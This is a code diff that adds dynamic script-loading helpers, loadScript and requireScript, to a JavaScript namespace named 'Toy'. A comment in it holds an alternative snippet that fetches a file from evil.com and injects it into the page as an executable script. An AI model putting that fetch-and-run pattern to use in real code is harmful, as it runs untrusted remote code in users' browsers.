@@ -2914,4 +2914,62 @@ namespace Toy {
   // sign", &#x26a0, and font-awesome 4.7.0 "fa fa-question-circle".
   export var infoChar = '<span style="color:blue">&#x24d8;</span>';
 
+  // Dynamic script loading
+
+  /**
+   * Initiates loading and running the script at the given URL string,
+   * returning a Promise that resolves on completion of loading.
+   * The script will execute later, in the order of requests issued
+   * through this function.
+   * 
+   * TODO: Consider registering the URLs of all scripts successfully
+   *   loaded.
+   */
+  export function loadScript(url) {
+    let script = document.createElement('script');
+    script.src = url;
+    script.async = false;
+    return new Promise((resolve, reject) => {
+      script.onload = resolve;
+      script.onerror = reject;
+      document.head.appendChild(script);
+    });
+  }
+
+  /**
+   Alternative code for the above, using fetch, which
+   allows request headers to be set:
+
+   fetch('https://evil.com/1.txt').then(function(response) { 
+        if (!response.ok) { 
+            return false; 
+        } 
+        return response.blob(); 
+    }) .then(function(myBlob) { 
+        var objectURL = URL.createObjectURL(myBlob); 
+        var sc = document.createElement("script");
+        sc.setAttribute("src", objectURL); 
+        sc.setAttribute("type", "text/javascript"); 
+        document.head.appendChild(sc);
+    })
+   */
+
+  // Set of URLs of scripts that have been required so far.
+  export const requiredScripts = new Set();
+
+  /**
+   * If the given URL string has not previously been used in a call to
+   * requireScript, calls loadScript to load the script, otherwise does
+   * nothing. Returns the Promise from loadScript, else a Promise that
+   * immediately resolves to true.
+   */
+  export function requireScript(url) {
+    if (!requiredScripts.has(url)) {
+      requiredScripts.add(url);
+      return loadScript(url);
+    } else {
+      return new Promise((resolve, reject) => resolve(true));
+    }
+  }
+
 }  // namespace;
